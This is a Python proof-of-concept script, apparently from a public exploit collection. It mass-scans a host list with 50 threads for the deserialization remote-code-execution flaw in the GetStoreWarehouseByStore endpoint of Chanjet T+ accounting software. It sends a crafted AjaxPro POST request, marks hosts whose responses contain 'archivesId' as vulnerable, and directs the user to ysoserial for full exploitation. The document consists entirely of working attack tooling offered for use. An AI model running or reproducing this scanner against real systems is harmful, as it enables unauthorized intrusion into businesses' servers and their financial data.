#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# app="畅捷通-TPlus" && icon_hash="-2067519629"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                   +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                           +')
    print(
        '+ EXP: python3 ChangJieTongTPlus_GetStoreWarehouseByStore_Rce_Poc.py url.txt                                                         +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
}  
def poc(host):
    url = host
    headers = {
        "X-Ajaxpro-Method": "GetStoreWarehouseByStore",
        "Host":"%s" %host   
    }
    data ='{\r\n"storeID":{}\r\n}'
    vulurl = "http://"+url + "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
    try:
        
        r = requests.post(vulurl, headers=headers,data=data)
        if r.status_code==200 and "archivesId" in r.text :
            print("http://"+host+":true")
            print("请使用ysoserial进行反序列化利用:https://blog.csdn.net/qq_41904294/article/details/131350965")
        else:
            return 0
            print (host+":false")
    except:
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])